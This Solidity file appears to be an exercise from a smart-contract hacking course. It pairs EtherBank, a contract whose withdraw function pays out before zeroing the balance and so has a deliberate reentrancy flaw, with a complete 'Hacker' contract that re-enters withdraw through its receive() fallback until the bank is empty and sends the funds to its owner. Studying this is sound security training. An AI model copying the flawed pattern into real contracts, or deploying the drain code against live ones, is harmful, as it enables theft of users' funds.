// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;
import "hardhat/console.sol";

/**
 * @title EtherBank
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract EtherBank {
  mapping(address => uint256) public balances;

  function depositETH() public payable {
    balances[msg.sender] += msg.value;
    console.log("Deposit 1ETH");
  }

  function withdrawETH() public {
    uint256 balance = balances[msg.sender];
    console.log("Balance of %s is: %s", msg.sender, balance);

    // Send ETH
    (bool success, ) = msg.sender.call{ value: balance }("");
    require(success, "Withdraw failed");

    // Update Balance
    balances[msg.sender] = 0;
  }
}

interface IEtherBank {
  function withdrawETH() external;

  function depositETH() external payable;
}

contract Hacker {
  IEtherBank bank;
  address payable owner;

  constructor(address _EtherBankAddress) payable {
    bank = IEtherBank(_EtherBankAddress);
    owner = payable(msg.sender);
    bank.depositETH{ value: 1 ether }();
    console.log("Succesfully deployed on address: %s", address(this));
    console.log("Balance of Attcker is : %s", address(owner).balance);
  }

  function callingWithdraw() external payable {
    bank.withdrawETH();
  }

  receive() external payable {
    if (address(bank).balance != 0) {
      bank.withdrawETH();
    } else {
      console.log("Reentrancy Finish");
      console.log("Balance of Bank is : %s", address(bank).balance);
      console.log("Balance of Hacker Contract is : %s", address(this).balance);
      (bool success, ) = owner.call{ value: address(this).balance }("");
      require(success);
      console.log("Balance of Attacker is : %s", address(owner).balance);
      console.log("Balance of Hacker Contract is : %s", address(this).balance);
    }
  }
}
